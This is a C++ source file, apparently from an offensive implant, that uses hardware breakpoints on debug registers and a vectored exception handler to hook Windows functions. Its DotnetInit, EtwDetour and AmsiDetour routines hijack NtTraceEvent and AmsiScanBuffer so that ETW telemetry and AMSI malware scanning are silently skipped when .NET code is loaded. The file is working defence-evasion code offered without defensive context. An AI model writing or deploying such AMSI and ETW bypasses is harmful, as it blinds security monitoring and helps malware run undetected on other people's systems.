#include <general.h>

auto declfn Hwbp::SetDr7(
    _In_ UPTR ActVal,
    _In_ UPTR NewVal,
    _In_ INT  StartPos,
    _In_ INT  BitsCount
) -> UPTR {
    if (StartPos < 0 || BitsCount <= 0 || StartPos + BitsCount > 64) {
        return ActVal;
    }
    
    UPTR Mask = (1ULL << BitsCount) - 1ULL;
    return (ActVal & ~(Mask << StartPos)) | ((NewVal & Mask) << StartPos);
}

auto declfn Hwbp::Init( VOID ) -> BOOL {
    g_instance

    if ( self->Hwbp.Init ) return TRUE;

    PVOID ExceptionHandler = (PVOID)&Hwbp::HandleException;

    self->Hwbp.Handler = self->ntdll.RtlAddVectoredExceptionHandler(
        TRUE, (PVECTORED_EXCEPTION_HANDLER)ExceptionHandler
    );

    self->Hwbp.Init = TRUE;

    return TRUE;
}

auto declfn Hwbp::Install(
    _In_ UPTR  Address,
    _In_ INT8  Drx,
    _In_ PVOID Callback
) -> BOOL {
    g_instance

    if (Drx < 0 || Drx > 3) return FALSE;

    self->Hwbp.Callbacks[Drx] = (UPTR)Callback;
    self->Hwbp.Addresses[Drx] = Address;

    return Hwbp::SetBreak(Address, Drx, TRUE);
}

auto declfn Hwbp::SetBreak(
    UPTR  Address,
    INT8  Drx,
    BOOL  Init
) -> BOOL {
    g_instance

    if (Drx < 0 || Drx > 3) return FALSE;

    CONTEXT  Ctx    = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };
    HANDLE   Handle = NtCurrentThread();
    NTSTATUS Status = STATUS_SUCCESS;

    Status = self->ntdll.NtGetContextThread( Handle, &Ctx );

    if (Init) {
        (&Ctx.Dr0)[Drx] = Address;
        Ctx.Dr7 = Hwbp::SetDr7(Ctx.Dr7, 3, (Drx * 2), 2); // active breakpoint
    } else {
        (&Ctx.Dr0)[Drx] = 0;
        Ctx.Dr7 = Hwbp::SetDr7(Ctx.Dr7, 0, (Drx * 2), 2); // desactive breakpoint
    }
    
    Status = self->ntdll.NtContinue( &Ctx, FALSE );

    return NT_SUCCESS(Status);
}

auto declfn Hwbp::GetArg(
    _In_ PCONTEXT Ctx,
    _In_ ULONG    Idx
) -> UPTR {
#ifdef _WIN64
    switch (Idx) {
        case 1: return Ctx->Rcx;
        case 2: return Ctx->Rdx;
        case 3: return Ctx->R8;
        case 4: return Ctx->R9;
    }
    return *(UPTR*)(Ctx->Rsp + (Idx * sizeof(PVOID)));
#else
    return *(ULONG*)(Ctx->Esp + (Idx * sizeof(PVOID)));
#endif
}

auto declfn Hwbp::SetArg(
    _In_ PCONTEXT Ctx,
    _In_ UPTR     Val,
    _In_ ULONG    Idx
) -> VOID {
#ifdef _WIN64
    switch (Idx) {
        case 1: Ctx->Rcx = Val; return;
        case 2: Ctx->Rdx = Val; return;
        case 3: Ctx->R8 = Val; return;
        case 4: Ctx->R9 = Val; return;
    }
    *(UPTR*)(Ctx->Rsp + (Idx * sizeof(PVOID))) = Val;
#else
    *(ULONG*)(Ctx->Esp + (Idx * sizeof(PVOID))) = Val;
#endif
}

auto declfn Hwbp::HandleException(
    EXCEPTION_POINTERS* e
) -> LONG {
    g_instance


    if ( e->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP ) {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    INT8 Drx = -1;
    for ( INT8 i = 0; i < 4; i++ ) {
        if ( e->ExceptionRecord->ExceptionAddress == (PVOID)self->Hwbp.Addresses[i] ) { 
            Drx = i;
            break;
        }
    }

    if (Drx == -1 || !self->Hwbp.Callbacks[Drx]) {
        return EXCEPTION_CONTINUE_SEARCH;
    }


    Hwbp::SetBreak( self->Hwbp.Addresses[Drx], Drx, FALSE);


    VOID ( * CallBackRun )( PCONTEXT )= reinterpret_cast<decltype(CallBackRun)>(self->Hwbp.Callbacks[Drx]);
    CallBackRun(e->ContextRecord);


    Hwbp::SetBreak( self->Hwbp.Addresses[Drx], Drx, TRUE);


    return EXCEPTION_CONTINUE_EXECUTION;
}

auto declfn Hwbp::PatchExitDetour(PCONTEXT Ctx) -> VOID {
    Ctx->Rax = 0;
    Ctx->Rip = *(UPTR*)Ctx->Rsp;
    Ctx->Rsp += sizeof(PVOID);
} 

auto declfn Hwbp::DotnetInit( INT32 BypassFlags ) -> BOOL {
    g_instance

    if (!Hwbp::Init()) return FALSE;

    BOOL Success = TRUE;

    if ( BypassFlags ) {
        if ( BypassFlags == DOTNET_BYPASS_ETW || BypassFlags == DOTNET_BYPASS_ALL ) {
            Success = Hwbp::Install( (UPTR)self->Hwbp.NtTraceEvent, Dr::x1, (PVOID)Hwbp::EtwDetour );
            if ( ! Success ) return Success;
        }

        if ( BypassFlags == DOTNET_BYPASS_AMSI || BypassFlags == DOTNET_BYPASS_ALL ) {
            Success = Hwbp::Install( (UPTR)self->Hwbp.AmsiScanBuffer, Dr::x2, (PVOID)Hwbp::AmsiDetour );
            if ( ! Success ) return Success;
        }
    }

    return Success;
}

auto declfn Hwbp::Clean() -> BOOL {
    g_instance

    CONTEXT Ctx = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };
    
    self->ntdll.NtGetContextThread( NtCurrentThread(), &Ctx );
    
    Ctx.Dr0 = 0;
    Ctx.Dr1 = 0;
    Ctx.Dr2 = 0;
    Ctx.Dr3 = 0;
    Ctx.Dr7 = 0;
    
    for (INT8 i = 0; i < 4; i++) {
        self->Hwbp.Callbacks[i] = (UPTR)nullptr;
        self->Hwbp.Addresses[i] = 0;
    }

    self->ntdll.RtlRemoveVectoredExceptionHandler( self->Hwbp.Handler );
    
    return self->ntdll.NtContinue( &Ctx, FALSE );
}

auto declfn Hwbp::DotnetExit() -> BOOL {
    return Hwbp::Clean();
}

auto declfn Hwbp::EtwDetour( PCONTEXT Ctx ) -> VOID {
    Ctx->Rip  = *(UPTR*)Ctx->Rsp;
    Ctx->Rsp += sizeof(PVOID);
    Ctx->Rax  = STATUS_SUCCESS;
}

auto declfn Hwbp::AmsiDetour( PCONTEXT Ctx ) -> VOID {
    g_instance

    Ctx->Rdx    = (UPTR)load_api(load_module(hashstr("ntdll.dll")), hashstr("NtAllocateVirtualMemory"));
    Ctx->EFlags = (Ctx->EFlags | (1 << 16)); 
}